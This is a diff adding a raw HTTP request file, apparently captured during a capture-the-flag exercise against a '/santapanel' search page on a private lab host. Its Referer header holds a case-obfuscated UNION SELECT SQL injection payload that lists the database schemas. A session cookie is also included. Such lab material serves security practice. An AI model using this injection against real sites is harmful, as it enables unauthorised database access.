@@ -1,0 +1,11 @@
+GET /santapanel?search=a HTTP/1.1
+Host: 10.10.94.110:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.10.94.110:8000/santapanel?search=%27+UniOn+Select+1%2CgRoUp_cOncaT%280x7c%2Cschema_name%2C0x7c%29%2BfRoM%2Binformation_schema.schemata
+Cookie: session=eyJhdXRoIjp0cnVlfQ.X8vexQ.E8AWJTAen624YLc0Sxe6pEZYf1o
+Upgrade-Insecure-Requests: 1
+
